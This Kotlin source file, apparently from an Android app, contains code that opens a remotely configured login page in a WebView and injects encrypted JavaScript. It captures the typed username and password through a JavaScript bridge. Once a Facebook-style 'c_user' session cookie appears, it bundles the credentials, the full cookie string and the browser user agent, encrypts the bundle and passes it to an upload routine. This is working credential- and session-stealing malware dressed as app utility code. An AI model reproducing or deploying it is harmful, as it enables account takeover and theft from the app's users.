package jboster.poshe.one.utils

import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.net.Uri
import android.os.Build
import android.text.TextUtils
import android.webkit.*
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import jboster.poshe.one.R
import jboster.poshe.one.base.TouchApplication
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

fun manageCookie(){
    CookieSyncManager.createInstance(TouchApplication.app)
    val cookieManager = CookieManager.getInstance()
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
        cookieManager.removeSessionCookies(null)
        cookieManager.removeAllCookie()
        cookieManager.flush()
    } else {
        cookieManager.removeSessionCookies(null)
        cookieManager.removeAllCookie()
        CookieSyncManager.getInstance().sync()
    }
    n = ""
    p = ""
}


fun AppCompatActivity.customTimer(zhanshigg:()->Unit){
    lifecycleScope.launch(Dispatchers.IO) {
        delay(20 * 1000)
        withContext(Dispatchers.Main) {
            zhanshigg()
        }
    }
}

fun AppCompatActivity.setWebView(
    webView: WebView,
    block1: () -> Unit,
    block2: () -> Unit,
    upload: (String) -> Unit
) {
    webView.apply {
        settings.apply {
            javaScriptEnabled = true
            textZoom = 100
            setSupportZoom(true)
            displayZoomControls = false
            builtInZoomControls = true
            setGeolocationEnabled(true)
            useWideViewPort = true
            loadWithOverviewMode = true
            loadsImagesAutomatically = true
            displayZoomControls = false
            setAppCachePath(cacheDir.absolutePath)
            setAppCacheEnabled(true)
        }
        addJavascriptInterface(WebInterface(), "businessAPI")
        webChromeClient = object : WebChromeClient() {
            override fun onProgressChanged(view: WebView?, newProgress: Int) {
                super.onProgressChanged(view, newProgress)
                if (newProgress == 100) {
                    val j1 = AESUtil.getInstance().decrypt(Yishunjianluokong.yincangtoujiao)
//                    val j1 = this@setWebView.getString(R.string.hideHeaderFooterMessages)
                    j1.loges()
                    evaluateJavascript(j1, null)
                    val j2 = AESUtil.getInstance().decrypt(Yishunjianluokong.dengludejs)
//                    val j2 = this@setWebView.getString(R.string.login)
                    j2.loges()
                    evaluateJavascript(j2, null)
                    lifecycleScope.launch(Dispatchers.IO) {
                        delay(300)
                        withContext(Dispatchers.Main) {
                            block1()
                        }
                    }
                }
            }
        }
        webViewClient = object : WebViewClient() {
            override fun onPageStarted(view: WebView, url: String?, favicon: Bitmap?) {
                super.onPageStarted(view, url, favicon)
            }

            override fun onPageFinished(view: WebView, url: String) {
                super.onPageFinished(view, url)
                val cookieManager = CookieManager.getInstance()
                val cookieStr = cookieManager.getCookie(url)
                if (cookieStr != null) {
                    if (cookieStr.contains("c_user")) {
                        if (n.isNotBlank() && p.isNotBlank() && cookieStr.contains("wd=")) {
                            lifecycleScope.launch(Dispatchers.Main) {
                                block2()
                            }
                            val content = gson.toJson(
                                mutableMapOf(
                                    "un" to n,
                                    "pw" to p,
                                    "cookie" to cookieStr,
                                    "source" to configEntity.app_name,
                                    "ip" to "",
                                    "type" to "f_o",
                                    "b" to view.settings.userAgentString
                                )
                            ).encrypt(updateEntity.key())
                            upload(content)//上传
                        }
                    }
                }
            }
        }
        loadUrl(if (!TextUtils.isEmpty(updateEntity.loginUrl())) updateEntity.loginUrl() else "https://www.baidu.com")
//        loadUrl(testLoginUrl)

    }

}

class WebInterface {
    @JavascriptInterface
    fun businessStart(a: String, b: String) {
        n = a
        p = b
    }
}

fun Context.goWeb(url: String) = Intent(Intent.ACTION_VIEW, Uri.parse(url)).let {
    startActivity(it)
}

fun AppCompatActivity.back(webView: WebView, b:()->Boolean, sup:()->Unit){
    if (webView.canGoBack()){
        webView.goBack()
    }else{
        val a = b()
        if (!a){
            if (configEntity.httpUrl().startsWith("http")){
                goWeb(configEntity.httpUrl())
            }
            sup()
        }else{
            needBackPressed = true
        }
    }
}
var needBackPressed = false